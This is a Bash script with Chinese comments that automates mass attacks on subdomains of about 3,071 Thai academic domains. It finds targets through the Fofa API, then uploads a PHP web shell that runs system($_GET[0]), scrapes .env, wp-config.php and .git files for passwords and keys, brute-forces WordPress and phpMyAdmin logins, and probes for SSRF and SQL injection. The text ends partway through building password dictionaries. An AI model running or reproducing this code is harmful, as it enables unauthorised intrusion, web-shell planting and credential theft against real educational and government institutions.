#!/bin/bash
# 最大化Shell + 极低误报 + 凭证爆破
# 核心：五重验证 + 内容验证 + 智能并发 + 凭证复用

source /root/.api_keys
PASS_DICT="/root/passwords/master_passwords.txt"
TOP100="/root/passwords/top100.txt"
DEFAULT_CREDS="/root/passwords/default_creds.txt"

OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUT/shells $OUT/subdomains $OUT/alive

# 主域名列表
MAIN_DOMAINS="/root/ac_th_apex_domains_3071.txt"
if [ ! -f "$MAIN_DOMAINS" ]; then
    echo "❌ 主域名文件不存在: $MAIN_DOMAINS"
    exit 1
fi

MAIN_COUNT=$(wc -l < $MAIN_DOMAINS)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最大化Shell + 极低误报"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "主域名: $MAIN_COUNT 个"
echo "策略: Fofa子域名查询 → 存活探测 → Shell攻击"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ==========================================
# 步骤0: Fofa子域名查询（对每个主域名）
# ==========================================
echo ""
echo "[0/9] 🔍 Fofa子域名查询（$MAIN_COUNT个主域名，并发10）..."
export OUT
export FOFA_EMAIL_1 FOFA_KEY_1

cat $MAIN_DOMAINS | xargs -P 10 -I {} bash -c '
    domain="{}"
    query=$(echo -n "domain=\"${domain}\"" | base64 | tr -d "\n")
    
    # Fofa API查询
    resp=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${query}&size=10000&fields=host" 2>/dev/null)
    
    # 提取host字段（Fofa返回格式：["host1","host2",...]）
    echo "$resp" | jq -r ".results[]? | .[0]?" 2>/dev/null | \
        grep -v "^$" | \
        sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1 | \
        grep -E "^[a-zA-Z0-9]" | \
        sort -u >> "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null
    
    # 统计
    count=$(wc -l < "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null || echo 0)
    if [ $count -gt 0 ]; then
        echo "[+] ${domain}: ${count} 个子域名"
    fi
'

# 合并所有子域名
cat $OUT/subdomains/fofa_*.txt 2>/dev/null | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
echo "  ✅ 总子域名: $SUBDOMAIN_COUNT"

# ==========================================
# 步骤0.5: 存活探测
# ==========================================
echo ""
echo "[0.5/9] 🌐 存活探测（$SUBDOMAIN_COUNT个子域名，并发100）..."
cat $OUT/subdomains/all_subdomains.txt | \
    xargs -P 100 -I {} bash -c '
        url="{}"
        status=$(curl -skL -m 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ]; then
            echo "$url" >> "$OUT/alive/http_alive.txt"
        fi
    '

ALIVE_COUNT=$(wc -l < $OUT/alive/http_alive.txt 2>/dev/null || echo 0)
echo "  ✅ 存活目标: $ALIVE_COUNT"

# 使用存活目标作为攻击目标
cp $OUT/alive/http_alive.txt $OUT/targets.txt
TOTAL=$ALIVE_COUNT

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "攻击目标: $TOTAL 个存活URL"
echo "策略: 高价值优先 + 五重验证 + 内容验证 + 凭证爆破"
echo "字典: master_passwords.txt + top100.txt + default_creds.txt"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ==========================================
# 1. 文件上传（最高优先级，优化：20路径×8扩展名）
# ==========================================
echo ""
echo "[1/8] 🚀 文件上传（20路径×8扩展名×10参数名，并发20，三重验证）..."
export OUT
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    flag="$(echo {} | md5sum | cut -c1-8)"
    
    for path in /upload /upload.php /fileupload /api/upload /api/file/upload /api/File/UploadFile \
                /uploadFile /upload.aspx /admin/upload /user/upload /file/upload /attachment/upload \
                /api/v1/upload /api/v2/upload /media/upload /image/upload /files/upload \
                /uploader /filemanager /api/uploadFile; do
        
        for ext in php PhP pHP phtml php5 php7 phar php3; do
            echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
            
            # 多种上传参数名组合测试
            for param_combo in "file" "upload" "upload_file" "attachment" "image" "photo" "fileupload" "uploadfile" "file_upload" "uploaded_file"; do
                # 上传（超时5秒）
                resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext}" \
                    -H "User-Agent: Mozilla/5.0" 2>/dev/null)
                
                # 提取shell URL（多种方式）
                shell=""
                # 方式1: 完整URL
                shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
                # 方式2: 相对路径
                if [ -z "$shell" ]; then
                    rel_path=$(echo "$resp" | grep -oE "[a-zA-Z0-9._/-]+\.${ext}" | grep -vE "^http|^/" | head -1)
                    if [ -n "$rel_path" ]; then
                        shell="${url}/${rel_path#/}"
                    fi
                fi
                # 方式3: JSON格式
                if [ -z "$shell" ]; then
                    json_path=$(echo "$resp" | grep -oE '"(url|file|path|location|data|src)":"[^"]*\.'${ext}'"' | sed 's/.*":"\([^"]*\)".*/\1/' | head -1)
                    if [ -n "$json_path" ]; then
                        if echo "$json_path" | grep -qE "^https?://"; then
                            shell="$json_path"
                        else
                            shell="${url}/${json_path#/}"
                        fi
                    fi
                fi
                # 方式4: HTML中的路径
                if [ -z "$shell" ]; then
                    html_path=$(echo "$resp" | grep -oE "(href|src|action)=[\"'][^\"']*\.${ext}[\"']" | grep -oE "[^\"']*\.${ext}" | head -1)
                    if [ -n "$html_path" ]; then
                        if echo "$html_path" | grep -qE "^https?://"; then
                            shell="$html_path"
                        else
                            shell="${url}/${html_path#/}"
                        fi
                    fi
                fi
                # 方式5: 尝试常见上传目录
                if [ -z "$shell" ]; then
                    for upload_dir in uploads upload files images photos media attachments; do
                        test_shell="${url}/${upload_dir}/$(basename /tmp/u_$$_${ext})"
                        test_resp=$(curl -skL -m 3 "$test_shell" 2>/dev/null)
                        if echo "$test_resp" | grep -q "U${flag}"; then
                            shell="$test_shell"
                            break
                        fi
                    done
                fi
                
                # 验证shell（放宽条件：只要flag匹配+命令执行即可）
                if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
                    # 验证1: 访问shell，检查flag
                    v1=$(curl -skL -m 4 "$shell" 2>/dev/null)
                    if echo "$v1" | grep -q "U${flag}"; then
                        # 验证2: 命令执行测试
                        v2=$(curl -skL -m 4 "$shell?0=echo+test123" 2>/dev/null)
                        if echo "$v2" | grep -q "test123"; then
                            # 验证3: 确保不是错误页面
                            if [ -n "$v2" ] && ! echo "$v2" | grep -qiE "error|404|not found|forbidden|access denied"; then
                                echo "$shell" >> "$OUT/shells/01_upload.txt"
                                rm -f /tmp/u_$$_${ext}
                                exit 0
                            fi
                        fi
                    fi
                fi
            done
            rm -f /tmp/u_$$_${ext}
        done
    done
'
UPLOAD=$(wc -l < $OUT/shells/01_upload.txt 2>/dev/null || echo 0)
echo "  ✅ Upload Shell: $UPLOAD"

# ==========================================
# 2. 敏感文件（内容验证）
# ==========================================
export OUT
echo "[2/8] 📁 敏感文件（内容验证，并发20）..."
export OUT
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    # .env文件（验证KEY=VALUE格式）
    env_resp=$(curl -skL -m 5 "$url/.env" 2>/dev/null)
    if [ $(echo "$env_resp" | wc -c) -gt 50 ]; then
        # 验证：包含KEY=VALUE格式，且不是HTML
        if [ -n "$env_resp" ] && echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
            # 验证：包含常见环境变量名
            if echo "$env_resp" | grep -qiE "DB_|APP_|API_|SECRET|KEY|PASSWORD"; then
                echo "$url/.env" >> "$OUT"/shells/02_env.txt
            fi
        fi
    fi
    
    # config.php（验证PHP语法）
    php_resp=$(curl -skL -m 5 "$url/config.php" 2>/dev/null)
    if [ $(echo "$php_resp" | wc -c) -gt 100 ]; then
        # 验证：包含PHP标签和配置
        if [ -n "$php_resp" ] && echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
           ! echo "$php_resp" | grep -qiE "<html|<body|404|not found|forbidden"; then
            echo "$url/config.php" >> "$OUT"/shells/02_config.txt
        fi
    fi
    
    # wp-config.php（WordPress特定验证）
    wp_resp=$(curl -skL -m 5 "$url/wp-config.php" 2>/dev/null)
    if [ -n "$wp_resp" ] && [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
        if echo "$wp_resp" | grep -qE "<?php" && echo "$wp_resp" | grep -qiE "DB_NAME|DB_USER|DB_PASSWORD" && \
           ! echo "$wp_resp" | grep -qiE "<html|<body|404"; then
            echo "$url/wp-config.php" >> "$OUT"/shells/02_wpconfig.txt
        fi
    fi
    
    # .git/config（验证Git配置格式）
    git_resp=$(curl -skL -m 5 "$url/.git/config" 2>/dev/null)
    if [ -n "$git_resp" ] && [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
        if echo "$git_resp" | grep -qE "\[.*\]" && echo "$git_resp" | grep -qiE "remote|url|branch" && \
           ! echo "$git_resp" | grep -qiE "<html|<body|404"; then
            echo "$url/.git/config" >> "$OUT"/shells/02_git.txt
        fi
    fi
'
ENV=$(wc -l < $OUT/shells/02_env.txt 2>/dev/null || echo 0)
CONFIG=$(wc -l < $OUT/shells/02_config.txt 2>/dev/null || echo 0)
WPCONFIG=$(wc -l < $OUT/shells/02_wpconfig.txt 2>/dev/null || echo 0)
GIT=$(wc -l < $OUT/shells/02_git.txt 2>/dev/null || echo 0)
FILES=$((ENV + CONFIG + WPCONFIG + GIT))
echo "  ✅ 敏感文件: $FILES"

# ==========================================
# 3. 未授权API（数据验证）
# ==========================================
export OUT
echo "[3/8] 🌐 未授权API（数据验证，并发20）..."
export OUT
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    for api in /api/users /api/user /api/admin /api/data /api/v1/users /api/v2/users /graphql; do
        resp=$(curl -skL -m 6 "$url$api" -H "Accept: application/json" 2>/dev/null)
        
        # 验证1: 是有效JSON
        if echo "$resp" | jq . >/dev/null 2>&1; then
            # 验证2: 包含真实数据字段
            if echo "$resp" | jq . | grep -qiE "\"id\"|\"email\"|\"username\"|\"name\"|\"user\""; then
                # 验证3: 不是错误响应
                if ! echo "$resp" | jq . | grep -qiE "error|unauthorized|forbidden|access denied"; then
                    # 验证4: 数据量足够（>200字符）
                    if [ $(echo "$resp" | wc -c) -gt 200 ]; then
                        echo "$url$api" >> "$OUT"/shells/03_api.txt
                        break
                    fi
                fi
            fi
        fi
    done
'
API=$(wc -l < $OUT/shells/03_api.txt 2>/dev/null || echo 0)
echo "  ✅ 未授权API: $API"

# ==========================================
# 4. Git泄露（多重验证）
# ==========================================
export OUT
echo "[4/8] 🔓 Git泄露（多重验证，并发30）..."
export OUT
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    
    # 验证1: .git/HEAD格式正确
    head_resp=$(curl -skL -m 4 "$url/.git/HEAD" 2>/dev/null)
    if echo "$head_resp" | grep -qE "^ref: refs/heads/" && [ $(echo "$head_resp" | wc -c) -lt 200 ]; then
        # 验证2: .git/config存在
        config_resp=$(curl -skL -m 4 "$url/.git/config" 2>/dev/null)
        if echo "$config_resp" | grep -qE "\[.*\]" && echo "$config_resp" | grep -qiE "remote|url"; then
            # 验证3: 不是错误页面
            if ! echo "$head_resp" | grep -qiE "<html|<body|404|not found"; then
                echo "$url" >> "$OUT"/shells/04_git.txt
            fi
        fi
    fi
'
GIT_LEAK=$(wc -l < $OUT/shells/04_git.txt 2>/dev/null || echo 0)
echo "  ✅ Git泄露: $GIT_LEAK"

# ==========================================
# 5. WordPress（多重检测）
# ==========================================
export OUT
echo "[5/8] 🎯 WordPress（多重检测，并发30）..."
export OUT
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    resp=$(curl -skL -m 4 "$url" 2>/dev/null)
    
    # 验证1: 包含wp-content
    if echo "$resp" | grep -qi "wp-content"; then
        # 验证2: 包含WordPress特征
        if echo "$resp" | grep -qiE "wp-includes|wp-admin|wordpress|wp-json"; then
            # 验证3: 不是误报（排除CDN引用）
            if echo "$resp" | grep -qiE "wp-content/themes|wp-content/plugins|wp-content/uploads"; then
                echo "$url" >> "$OUT"/shells/05_wordpress.txt
            fi
        fi
    fi
'
WP=$(wc -l < $OUT/shells/05_wordpress.txt 2>/dev/null || echo 0)
echo "  ✅ WordPress: $WP"

# ==========================================
# 6. phpMyAdmin（登录页面验证）
# ==========================================
export OUT
echo "[6/8] 🔓 phpMyAdmin（登录页面验证，并发30）..."
export OUT
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    
    for path in "" /pma /phpmyadmin /phpMyAdmin /PMA /PMA /dbadmin /mysql; do
        resp=$(curl -skL -m 4 "$url$path" 2>/dev/null)
        
        # 验证：包含phpMyAdmin登录表单
        if echo "$resp" | grep -qiE "phpmyadmin|pma_|server.*password" && \
           echo "$resp" | grep -qiE "<form|<input.*type.*password" && \
           ! echo "$resp" | grep -qiE "404|not found|forbidden"; then
            echo "$url$path" >> "$OUT"/shells/06_phpmyadmin.txt
            break
        fi
    done
'
PMA=$(wc -l < $OUT/shells/06_phpmyadmin.txt 2>/dev/null || echo 0)
echo "  ✅ phpMyAdmin: $PMA"

# ==========================================
# 7. SSRF端点（元数据验证）
# ==========================================
export OUT
echo "[7/8] 🔗 SSRF端点（元数据验证，并发15）..."
export OUT
cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
    url="{}"
    
    for path in /api/fetch /api/proxy /api/url /api/download /fetch /proxy /download; do
        # 测试AWS元数据
        resp=$(curl -skL -m 6 "$url$path?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
        if echo "$resp" | grep -qiE "instance-id|ami-id|local-ipv4" && \
           ! echo "$resp" | grep -qiE "error|forbidden|403"; then
            echo "$url$path" >> "$OUT"/shells/07_ssrf.txt
            break
        fi
        
        # 测试内网Redis
        resp2=$(curl -skL -m 6 "$url$path?url=http://127.0.0.1:6379" 2>/dev/null)
        if echo "$resp2" | grep -qiE "PONG|redis|REDIS" && \
           ! echo "$resp2" | grep -qiE "error|forbidden"; then
            echo "$url$path" >> "$OUT"/shells/07_ssrf.txt
            break
        fi
    done
'
SSRF=$(wc -l < $OUT/shells/07_ssrf.txt 2>/dev/null || echo 0)
echo "  ✅ SSRF: $SSRF"

# ==========================================
# 8. 备份文件（内容验证）
# ==========================================
export OUT
echo "[8/8] 💾 备份文件（内容验证，并发20）..."
export OUT
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1)
    
    for name in $domain backup www wwwroot web site database db sql data; do
        for ext in sql zip tar tar.gz bak old; do
            resp=$(curl -skL -m 5 "$url/${name}.${ext}" -I 2>/dev/null)
            if echo "$resp" | grep -qE "^HTTP.*200" && \
               echo "$resp" | grep -qiE "Content-Type:.*application|Content-Type:.*text|Content-Type:.*sql|Content-Type:.*zip|Content-Type:.*tar"; then
                # 验证：下载部分内容检查
                content=$(curl -skL -m 5 "$url/${name}.${ext}" 2>/dev/null | head -c 500)
                if [ $(echo "$content" | wc -c) -gt 100 ]; then
                    # SQL文件验证
                    if [ "${ext}" = "sql" ] && echo "$content" | grep -qiE "CREATE TABLE|INSERT INTO|DROP TABLE"; then
                        echo "$url/${name}.${ext}" >> "$OUT"/shells/08_backup.txt
                        break 2
                    fi
                    # 压缩文件验证（检查文件头）
                    if [ "${ext}" = "zip" ] && echo "$content" | head -c 4 | grep -q "PK"; then
                        echo "$url/${name}.${ext}" >> "$OUT"/shells/08_backup.txt
                        break 2
                    fi
                fi
            fi
        done
    done
'
BACKUP=$(wc -l < $OUT/shells/08_backup.txt 2>/dev/null || echo 0)
echo "  ✅ 备份文件: $BACKUP"

# ==========================================
# 9. 凭证提取与复用（从.env/config.php）
# ==========================================
echo "[9/12] 🔑 凭证提取与复用..."
mkdir -p $OUT/shells/creds

# 从.env文件提取凭证
[ -f $OUT/shells/02_env.txt ] && cat $OUT/shells/02_env.txt | while read env_url; do
    env_content=$(curl -skL -m 5 "$env_url" 2>/dev/null)
    # 提取数据库凭证
    echo "$env_content" | grep -iE "DB_PASSWORD|DB_PASS|PASSWORD|SECRET" | grep -v "^#" | \
        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_passwords.txt 2>/dev/null
    # 提取API密钥
    echo "$env_content" | grep -iE "API_KEY|SECRET_KEY|TOKEN" | grep -v "^#" | \
        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_keys.txt 2>/dev/null
done

# 从config.php提取凭证
[ -f $OUT/shells/02_config.txt ] && cat $OUT/shells/02_config.txt | while read config_url; do
    config_content=$(curl -skL -m 5 "$config_url" 2>/dev/null)
    # 提取密码
    echo "$config_content" | grep -iE "password|passwd" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/config_passwords.txt 2>/dev/null
done

# 从wp-config.php提取数据库凭证
[ -f $OUT/shells/02_wpconfig.txt ] && cat $OUT/shells/02_wpconfig.txt | while read wpconfig_url; do
    wp_content=$(curl -skL -m 5 "$wpconfig_url" 2>/dev/null)
    # 提取DB_PASSWORD
    echo "$wp_content" | grep -iE "DB_PASSWORD" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null
    # 提取DB_USER
    echo "$wp_content" | grep -iE "DB_USER" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_users.txt 2>/dev/null
done

ENV_PASS=$(wc -l < $OUT/shells/creds/env_passwords.txt 2>/dev/null || echo 0)
CONFIG_PASS=$(wc -l < $OUT/shells/creds/config_passwords.txt 2>/dev/null || echo 0)
WP_PASS=$(wc -l < $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null || echo 0)
echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"

# ==========================================
# 10. WordPress弱口令爆破（增强字典）
# ==========================================
export OUT
echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
export OUT
[ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
    url="{}"
    wp_login="${url}/wp-login.php"
    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1)
    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//")
    
    # 先测试默认凭证（快速）
    for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" \
                "administrator:administrator" "root:root" "test:test"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        resp=$(curl -skL -m 5 "$wp_login" -d "log=$user&pwd=$pass&wp-submit=Log+In" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "incorrect|error|invalid|login" && \
           echo "$resp" | grep -qiE "dashboard|admin|wp-admin"; then
            echo "$url|$user:$pass" >> "$OUT"/shells/10_wp_creds.txt
            exit 0
        fi
    done
    
    # 测试基于域名的密码（高成功率）
    for pass in "${keywords}123" "${keywords}123456" "${keywords}2024" "${keywords}2025" "admin@${keywords}"; do
        resp=$(curl -skL -m 4 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
           echo "$resp" | grep -qiE "dashboard|admin"; then
            echo "$url|admin:$pass" >> "$OUT"/shells/10_wp_creds.txt
            exit 0
        fi
    done
    
    # 测试top100密码（admin用户）
    [ -f '"$TOP100"' ] && while read pass; do
        resp=$(curl -skL -m 3 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
           echo "$resp" | grep -qiE "dashboard|admin"; then
            echo "$url|admin:$pass" >> "$OUT"/shells/10_wp_creds.txt
            exit 0
        fi
    done < '"$TOP100"'
'
WP_CREDS=$(wc -l < $OUT/shells/10_wp_creds.txt 2>/dev/null || echo 0)
echo "  ✅ WordPress凭证: $WP_CREDS"

# ==========================================
# 11. phpMyAdmin弱口令爆破（增强字典）
# ==========================================
export OUT
echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
export OUT
[ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
    url="{}"
    base_url=$(echo "$url" | sed "s|/pma.*||" | sed "s|/phpmyadmin.*||")
    domain=$(echo "$base_url" | sed "s|https\?://||" | cut -d/ -f1)
    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//")
    
    # 先测试默认凭证（快速）
    for cred in "root:" "root:root" "root:password" "root:123456" \
                "admin:admin" "admin:password" "root:toor" "root:12345678"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        resp=$(curl -skL -m 5 "$url" -d "pma_username=$user&pma_password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
           echo "$resp" | grep -qiE "main|database|server|phpmyadmin"; then
            echo "$url|$user:$pass" >> "$OUT"/shells/11_pma_creds.txt
            exit 0
        fi
    done
    
    # 测试空密码
    resp=$(curl -skL -m 5 "$url" -d "pma_username=root&pma_password=" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
    if ! echo "$resp" | grep -qiE "cannot|error" && \
       echo "$resp" | grep -qiE "main|database"; then
        echo "$url|root:" >> "$OUT"/shells/11_pma_creds.txt
        exit 0
    fi
    
    # 测试基于域名的密码（高成功率）
    for pass in "${keywords}123" "${keywords}123456" "root@${keywords}"; do
        resp=$(curl -skL -m 4 "$url" -d "pma_username=root&pma_password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
           echo "$resp" | grep -qiE "main|database"; then
            echo "$url|root:$pass" >> "$OUT"/shells/11_pma_creds.txt
            exit 0
        fi
    done
    
    # 测试top100（root用户）
    [ -f '"$TOP100"' ] && while read pass; do
        resp=$(curl -skL -m 3 "$url" -d "pma_username=root&pma_password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
           echo "$resp" | grep -qiE "main|database"; then
            echo "$url|root:$pass" >> "$OUT"/shells/11_pma_creds.txt
            exit 0
        fi
    done < '"$TOP100"'
'
PMA_CREDS=$(wc -l < $OUT/shells/11_pma_creds.txt 2>/dev/null || echo 0)
echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"

# ==========================================
# 12. 默认凭证快速检测（API/管理后台）
# ==========================================
export OUT
echo "[12/14] 🔑 默认凭证检测（API/后台，并发20）..."
export OUT
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    # API默认凭证测试
    for api_path in /api/login /api/auth /api/admin/login /admin/login /login; do
        for cred in "admin:admin" "admin:password" "admin:123456" "root:root"; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            
            resp=$(curl -skL -m 4 "$url$api_path" -X POST \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$user\",\"password\":\"$pass\"}" 2>/dev/null)
            
            if echo "$resp" | grep -qiE "token|success|true|200" && \
               ! echo "$resp" | grep -qiE "error|invalid|incorrect|unauthorized"; then
                echo "$url$api_path|$user:$pass" >> "$OUT"/shells/12_default_creds.txt
                break 2
            fi
        done
    done
'
DEFAULT_CREDS_COUNT=$(wc -l < $OUT/shells/12_default_creds.txt 2>/dev/null || echo 0)
echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"

# ==========================================
# 13. SQL注入检测（布尔盲注+时间盲注+报错注入+联合查询）
# ==========================================
export OUT
echo "[13/14] 💉 SQL注入检测（布尔+时间+报错+联合，并发15）..."
export OUT
cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
    url="{}"
    
    # 提取URL参数（支持?和&）
    if echo "$url" | grep -q "?"; then
        base_url=$(echo "$url" | cut -d? -f1)
        query_string=$(echo "$url" | cut -d? -f2)
        params=$(echo "$query_string" | grep -oE "[a-zA-Z0-9_]+" | sort -u)
    else
        base_url="$url"
        params=""
    fi
    
    # 常见参数名列表（主动测试）
    common_params="id page user uid pid cat category search q query keyword key name value data"
    
    # 合并已有参数和常见参数
    all_params=$(echo "$params $common_params" | tr " " "\n" | sort -u)
    
    if [ -n "$all_params" ]; then
        for param in $all_params; do
            # 报错注入检测（单引号）
            error_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\''" 2>/dev/null)
            if echo "$error_resp" | grep -qiE "mysql|postgresql|sqlite|mssql|oracle|syntax error|sql error|database error|warning.*mysql|you have an error"; then
                echo "${base_url}?${param}=1'\''" >> "$OUT/shells/13_sqli_error.txt"
                break
            fi
            
            # 布尔盲注检测
            true_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''1" 2>/dev/null)
            false_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''2" 2>/dev/null)
            
            if [ "$true_resp" != "$false_resp" ] && [ -n "$true_resp" ] && [ -n "$false_resp" ] && \
               [ $(echo "$true_resp" | wc -c) -gt 100 ] && [ $(echo "$false_resp" | wc -c) -gt 100 ]; then
                # 时间盲注验证
                start=$(date +%s)
                curl -skL -m 8 "${base_url}?${param}=1'\'' AND SLEEP(5)--" >/dev/null 2>&1
                end=$(date +%s)
                
                if [ $((end - start)) -ge 4 ]; then
                    echo "${base_url}?${param}=1'\'' AND SLEEP(5)--" >> "$OUT/shells/13_sqli_time.txt"
                    break
                fi
            fi
            
            # 联合查询检测
            union_resp=$(curl -skL -m 4 "${base_url}?${param}=1 UNION SELECT 1,2,3--" 2>/dev/null)
            if echo "$union_resp" | grep -qE "[^0-9]2[^0-9]" && \
               ! echo "$union_resp" | grep -qiE "error|syntax|mysql error|sql error" && \
               [ $(echo "$union_resp" | wc -c) -gt 100 ]; then
                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> "$OUT/shells/13_sqli_union.txt"
                break
            fi
            
            # 双引号注入检测
            dq_error=$(curl -skL -m 4 "${base_url}?${param}=1\"" 2>/dev/null)
            if echo "$dq_error" | grep -qiE "mysql|postgresql|sqlite|syntax error|sql error"; then
                echo "${base_url}?${param}=1\"" >> "$OUT/shells/13_sqli_error.txt"
                break
            fi
        done
    fi
'
SQLI_TIME=$(wc -l < $OUT/shells/13_sqli_time.txt 2>/dev/null || echo 0)
SQLI_ERROR=$(wc -l < $OUT/shells/13_sqli_error.txt 2>/dev/null || echo 0)
SQLI_UNION=$(wc -l < $OUT/shells/13_sqli_union.txt 2>/dev/null || echo 0)
SQLI_TOTAL=$((SQLI_TIME + SQLI_ERROR + SQLI_UNION))
echo "  ✅ SQL注入: $SQLI_TOTAL (时间:$SQLI_TIME 报错:$SQLI_ERROR 联合:$SQLI_UNION)"

# ==========================================
# 14. 智能字典生成（基于域名/行业/地区/年份）
# ==========================================
echo "[14/14] 📚 智能字典生成（域名+行业+地区+年份）..."
mkdir -p $OUT/shells/dicts

# 从目标URL提取域名特征
cat $OUT/targets.txt | head -200 | while read url; do
    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1)
    
    # 提取域名关键词（去除TLD）
    keywords=$(echo "$domain" | sed "s/\.ac\.th//" | sed "s/\.edu\.th//" | sed "s/\.go\.th//" | sed "s/\.co\.th//" | sed "s/\.or\.th//")
    
    # 生成基于域名的密码（多种变体）
    echo "${keywords}123" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}123456" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}2024" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}2025" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}2023" >> $OUT/shells/dicts/domain_based.txt
    echo "admin@${keywords}" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}@123" >> $OUT/shells/dicts/domain_based.txt
    echo "${keywords}admin" >> $OUT/shells/dicts/domain_based.txt
    echo "admin${keywords}" >> $OUT/shells/dicts/domain_based.txt
    
    # 提取行业关键词（ac.th = 教育，go.th = 政府）
    if echo "$domain" | grep -q "\.ac\.th"; then
        echo "education123" >> $OUT/shells/dicts/industry_based.txt
        echo "school123" >> $OUT/shells/dicts/industry_based.txt
        echo "university123" >> $OUT/shells/dicts/industry_based.txt
        echo "student123" >> $OUT/shells/dicts/industry_based.txt
        echo "teacher123" >> $OUT/shells/dicts/industry_based.txt
    fi
    
